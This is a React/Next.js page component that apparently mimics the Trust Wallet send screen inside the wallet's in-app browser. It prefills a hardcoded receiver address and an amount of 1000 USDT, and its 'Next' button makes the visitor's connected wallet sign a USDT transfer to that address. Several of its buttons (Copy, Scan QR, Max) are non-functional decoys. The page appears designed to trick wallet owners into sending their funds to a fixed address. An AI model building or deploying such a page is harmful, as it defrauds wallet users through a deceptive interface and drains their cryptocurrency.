"use client";

import { useState } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6";

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// ABI minimal ERC-20
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider with retries
// Trust Wallet can take a moment to inject window.ethereum
// ============================================================

function getProviderNow(): EthereumProvider | null {
  // Check multiple known locations
  if (window.ethereum) return window.ethereum;
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page (opens inside Trust Wallet browser)
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [amount, setAmount] = useState("1000");
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const parsedAmount = parseFloat(amount) || 0;

const handleSendUSDT = async () => {
 setStatus("");
 setTxHash("");
 setStatusType("info");

 setLoading(true);
 setStatus("Detecting wallet...");

 const ethereumProvider = await waitForProvider();
 if (!ethereumProvider) {
 setStatus("Error: No wallet detected.");
 setStatusType("error");
 setLoading(false);
 return;
 }

 setStatus("Preparing transaction...");

 const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
 const signer = await provider.getSigner();
 const userAddress = await signer.getAddress();

 setStatus(`Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}. Preparing transaction...`);

 const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
 const amountInWei = ethers.parseUnits(amount, USDT_DECIMALS);

 setStatus("Sending USDT...");

 try {
 const tx = await usdtContract.transfer(address, amountInWei);
 setStatus(`Transaction sent! Hash: ${tx.hash.slice(0, 10)}... Waiting for confirmation...`);
 setTxHash(tx.hash);

 const receipt = await tx.wait();
 if (receipt && receipt.status === 1) {
 setStatus(`✅ Transfer successful! ${amount} USDT sent.`);
 setStatusType("success");
 } else {
 setStatus("❌ Transaction failed on-chain.");
 setStatusType("error");
 }
 } catch (err: unknown) {
 console.error("Transfer error:", err);
 setStatus("Transaction failed.");
 setStatusType("error");
 } finally {
 setLoading(false);
 }
};

  return (
    <main className="transfer-main">
      {/* ===== Transfer Form ===== */}
      <div className="form-container">
        {/* --- Address or Domain Name --- */}
        <label className="form-label">Address or Domain Name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions">
            <button onClick={handlePaste} className="btn-paste">
              Paste
            </button>
            <button className="btn-icon" title="Copy">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
              </svg>
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 3H5a2 2 0 00-2 2v2" />
                <path d="M17 3h2a2 2 0 012 2v2" />
                <path d="M21 17v2a2 2 0 01-2 2h-2" />
                <path d="M7 21H5a2 2 0 01-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        {/* --- Destination network --- */}
        <label className="form-label form-label--spaced">
          Destination network
        </label>
        <div className="network-selector">
          <div className="eth-icon">
            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        {/* --- Amount --- */}
        <label className="form-label form-label--spaced">Amount</label>
        <div className="input-row">
          <input
            type="text"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="input-row__field input-row__field--amount"
          />
          <div className="amount-actions">
            <div className="stepper">
              <button className="btn-step" onClick={() => setAmount(String(parsedAmount + 1))}>
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="18 15 12 9 6 15" />
                </svg>
              </button>
              <button className="btn-step" onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}>
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>
            <span className="amount-currency">USDT</span>
            <button className="btn-max">Max</button>
          </div>
        </div>

        <p className="approx-price">≈ ${parsedAmount.toFixed(2)}</p>
      </div>

      {/* ===== Status Message ===== */}
      {status && (
        <div className={`status-message status-message--${statusType}`}>
          {status}
          {txHash && (
            <a
              href={`https://etherscan.io/tx/${txHash}`}
              target="_blank"
              rel="noopener noreferrer"
              className="status-link"
            >
              View on Etherscan ↗
            </a>
          )}
        </div>
      )}

      {/* ===== Next Button ===== */}
      <div className="next-btn-wrapper">
        <button
          onClick={handleSendUSDT}
          disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
        >
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              Processing...
            </span>
          ) : (
            "Next"
          )}
        </button>
      </div>
    </main>
  );
}
